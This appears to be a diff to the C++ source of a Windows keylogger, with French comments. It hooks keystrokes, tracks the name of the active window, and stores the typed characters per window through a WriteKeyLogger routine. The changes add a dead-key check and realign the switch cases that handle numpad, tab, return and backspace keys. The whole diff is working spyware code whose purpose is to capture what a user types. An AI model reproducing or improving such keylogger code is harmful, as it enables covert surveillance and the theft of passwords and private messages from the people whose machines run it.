@@ -19,6 +19,12 @@ GString		GetActiveWindowName(void)
 	return (buffer);
 }
 
+bool	IsDeadKey(int wparam)
+{
+	unsigned int code = MapVirtualKey(wparam, 2);
+	return (code & 0x80008000) ? true : false;
+} 
+
 void	WriteKeyLogger(GString Name)
 {
 	
@@ -44,9 +50,9 @@ void	WriteKeyLogger(GString Name)
 		 //on rajoute les touches non traitées par le hook
 		switch (hooked.vkCode)
 		{
-			case VK_TAB : { _map.EraseKey(name); WriteKeyLogger(name); break; }
-			case VK_RETURN : { _map.EraseKey(name); WriteKeyLogger(name); break; }
-			case VK_BACK : { _map[name] = _map[name].Substr(0, _map[name].Size() - 1); break; }
+			case VK_TAB     : { _map.EraseKey(name); WriteKeyLogger(name); break; }
+			case VK_RETURN  : { _map.EraseKey(name); WriteKeyLogger(name); break; }
+			case VK_BACK    : { _map[name] = _map[name].Substr(0, _map[name].Size() - 1); break; }
 			case VK_NUMPAD0 : { _map[name] += "0"; break; }
 			case VK_NUMPAD1 : { _map[name] += "1"; break; }
 			case VK_NUMPAD2 : { _map[name] += "2"; break; }
@@ -57,16 +63,12 @@ void	WriteKeyLogger(GString Name)
 			case VK_NUMPAD7 : { _map[name] += "7"; break; }
 			case VK_NUMPAD8 : { _map[name] += "8"; break; }
 			case VK_NUMPAD9 : { _map[name] += "9"; break; }
-
 			case VK_MULTIPLY: { _map[name] += "*"; break; }
-			case VK_ADD : { _map[name] += "+"; break; }
+			case VK_ADD     : { _map[name] += "+"; break; }
 			case VK_SUBTRACT: { _map[name] += "-"; break; }
 			case VK_DECIMAL : { _map[name] += "."; break; }
-			case VK_DIVIDE : { _map[name] += "/"; break; }
-
- 
-			case VK_DELETE: {printf("<Suppr>");break;}
-
+			case VK_DIVIDE  : { _map[name] += "/"; break; } 
+			case VK_DELETE  : {printf("<Suppr>");break;}
 			default : { // on affiche les touches tappées
 				ch=((char)wBuf);
 				_map[name] += ch;
